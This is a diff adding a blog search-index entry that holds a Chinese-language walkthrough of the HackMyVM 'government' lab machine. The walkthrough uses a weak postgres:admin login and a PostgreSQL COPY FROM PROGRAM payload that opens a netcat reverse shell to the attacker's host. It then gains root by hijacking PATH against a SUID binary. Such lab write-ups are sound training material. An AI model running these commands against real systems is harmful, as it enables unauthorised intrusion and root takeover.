@@ -1484,4 +1484,47 @@
         <tag>复盘</tag>
       </tags>
   </entry>
+  <entry>
+    <title>hackmyvm government复盘</title>
+    <url>/2024/06/20/hackmyvm-government%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫端口扫到21、22、80，先看21端口</p>
+<p>lftp连接可以看到有几个文件夹，里面都是一些txt</p>
+<p>有看到以下信息（对后续有点用）</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620194452.png"   style="zoom:50%;" >
+
+<p>还有这两个个文件，是一些md5加密后的数据（都能解开），还有几个用户名，保存下来hydra爆破ssh失败</p>
+<p>还有一些其他的txt，不知道能干嘛</p>
+<p>转向80端口，扫目录有不少东西</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195058.png" ></p>
+<p>最开始看了一下&#x2F;blog下面的，看不出什么cms，也没什么功能的，目录倒是很开放（没什么用</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>后来看了phppgadmin，是个数据库管理界面</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195222.png" ></p>
+<p>有个登录口，尝试使用 postgres:admin 弱口令登录（这个用户名有点没想到），登录成功，查找相关的漏洞</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195343.png" ></p>
+<p>直接可以反弹shell了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;nc -e /bin/bash 192.168.64.3 1234&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195510.png" ></p>
+<p>注意那个Paginate results不用勾选，然后成功反弹到shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195628.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>寻找了很久，发现在&#x2F;var&#x2F;log下有个.creds.log</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195807.png" ></p>
+<p>结合前面ftp看到的信息，可以知道是Blowfish加密，key和IV都给出来了，用工具解密即可</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195936.png" ></p>
+<p>拿到一串密钥，登录erik用户，能够拿到user.txt</p>
+<p>查找suid提权</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200131.png" ></p>
+<p>发现&#x2F;home&#x2F;erik&#x2F;backups&#x2F;nuclear下有个remove，用strings看一下大概是干嘛的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-20%2020.06.32.png" ></p>
+<p>可以知道执行了time命令，接下来的思路就是环境变量劫持了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash -p&#x27;&gt;/tmp/time</span><br><span class="line">chmod +x /tmp/time</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./remove a</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200824.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>前面ftp和80端口的&#x2F;blog太迷惑人，还有就是找到.creds.log要细心，其他地方都还好。</p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
 </search>
